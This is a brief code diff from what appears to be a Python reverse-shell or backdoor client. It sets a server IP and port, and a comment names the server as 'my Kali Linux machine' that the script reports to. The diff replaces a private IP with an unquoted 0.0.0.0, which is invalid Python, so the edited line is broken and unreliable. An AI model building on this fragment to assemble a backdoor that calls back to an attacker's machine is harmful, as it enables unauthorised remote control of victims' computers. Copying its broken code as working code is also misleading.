@@ -2,7 +2,7 @@ import os
 import socket
 import json
 
-SERVER_IP = '192.168.254.49'  # IP of my Kali Linux machine
+SERVER_IP = 0.0.0.0  # IP of my Kali Linux machine
 SERVER_PORT = 5555
 
 def reliable_send(data):
